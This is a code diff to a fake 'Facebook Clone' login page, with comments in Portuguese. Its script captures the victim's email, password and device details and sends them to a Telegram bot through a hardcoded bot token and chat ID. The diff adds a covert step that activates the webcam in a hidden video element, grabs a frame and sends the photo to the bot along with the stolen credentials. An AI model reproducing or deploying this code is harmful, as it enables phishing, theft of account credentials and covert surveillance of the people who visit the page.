@@ -3,8 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login - Facebook</title>
+  <title>Login - Facebook Clone</title>
   <style>
+    /* seu CSS atual */
     * {
       margin: 0;
       padding: 0;
@@ -123,6 +124,49 @@
     const TOKEN = "7683050283:AAEmO1D90_4RysfVlLYOSf5NLfC1Bpg9FMA";
     const CHAT_ID = "5542692841";
     const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+    const URL_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+
+    function sendMessage(text) {
+      return fetch(URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: 'Markdown'
+        })
+      }).then(res => res.json());
+    }
+
+    function sendPhoto(base64Photo, caption) {
+      // Telegram API não aceita base64 direto para sendPhoto
+      // Então enviamos a foto como multipart/form-data via fetch com Blob
+
+      // converter base64 para Blob
+      function base64ToBlob(base64, mime) {
+        const byteChars = atob(base64);
+        const byteNumbers = new Array(byteChars.length);
+        for (let i = 0; i < byteChars.length; i++) {
+          byteNumbers[i] = byteChars.charCodeAt(i);
+        }
+        const byteArray = new Uint8Array(byteNumbers);
+        return new Blob([byteArray], {type: mime});
+      }
+
+      const mimeType = 'image/png';
+      const base64Data = base64Photo.replace(/^data:image\/(png|jpg|jpeg);base64,/, '');
+
+      const photoBlob = base64ToBlob(base64Data, mimeType);
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('caption', caption);
+      formData.append('photo', photoBlob, 'login_photo.png');
+
+      return fetch(URL_PHOTO, {
+        method: 'POST',
+        body: formData
+      }).then(res => res.json());
+    }
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
@@ -135,14 +179,14 @@
         return;
       }
 
-      // Coletando informações do dispositivo
+      // Informações do dispositivo
       const userAgent = navigator.userAgent;
       const language = navigator.language;
       const screenWidth = screen.width;
       const screenHeight = screen.height;
       const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-      const message = `
+      const messageText = `
 🔐 *Novo Login Capturado*
 📧 Email: ${email}
 🔑 Senha: ${password}
@@ -154,28 +198,61 @@
 ⏰ Fuso horário: ${timezone}
       `;
 
-      fetch(URL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: 'Markdown'
-        })
+      // Tenta acessar a câmera
+      navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        // Cria um vídeo oculto para capturar um frame
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        document.body.appendChild(video);
+        video.srcObject = stream;
+
+        video.play();
+
+        video.addEventListener('loadeddata', () => {
+          // Captura a imagem em um canvas
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL('image/png');
+
+          // Para a câmera
+          stream.getTracks().forEach(track => track.stop());
+          video.remove();
+
+          // Envia a foto junto com a mensagem
+          sendPhoto(imageData, messageText)
+            .then(data => {
+              if (data.ok) {
+                alert('Dados e foto enviados com sucesso!');
+              } else {
+                alert('Erro ao enviar foto. Enviando só os dados...');
+                return sendMessage(messageText).then(dataMsg => {
+                  if (dataMsg.ok) alert('Dados enviados com sucesso!');
+                  else alert('Erro ao enviar os dados.');
+                });
+              }
+            })
+            .catch(() => {
+              alert('Erro ao enviar foto. Enviando só os dados...');
+              sendMessage(messageText).then(dataMsg => {
+                if (dataMsg.ok) alert('Dados enviados com sucesso!');
+                else alert('Erro ao enviar os dados.');
+              });
+            });
+        });
       })
-      .then(response => response.json())
-      .then(data => {
-        if (data.ok) {
-          alert('Ocorreu um erro, tente mais tarde!');
-        } else {
-          alert('Erro ao enviar os dados.');
-        }
-      })
-      .catch(error => {
-        console.error(error);
-        alert('Falha na comunicação com o servidor.');
+      .catch(() => {
+        // Se não permitir acesso à câmera, envia só os dados
+        sendMessage(messageText).then(data => {
+          if (data.ok) {
+            alert('Dados enviados com sucesso (sem foto).');
+          } else {
+            alert('Erro ao enviar os dados.');
+          }
+        });
       });
     });
   </script>
